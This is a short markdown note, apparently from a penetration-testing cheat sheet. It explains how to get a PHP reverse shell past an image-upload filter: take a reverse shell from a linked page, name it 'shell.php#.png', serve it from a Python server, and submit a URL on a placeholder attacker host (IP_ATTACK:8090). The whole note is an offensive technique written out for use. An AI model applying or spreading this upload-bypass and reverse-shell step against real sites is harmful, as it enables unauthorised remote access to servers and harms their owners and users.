- **Shell shenanigans**:
	- If you can upload images and its working with php you can try this:
	- 1st get a reverse shell like one in [Reverse shells ðŸ‘¾](Reverse%20shells%20ðŸ‘¾.md)
	- Then create a file like `shell.php#.png`
	- Serve a python server
	- Paste the path to it:

```shell
http://IP_ATTACK:8090/shell.php#.png
```
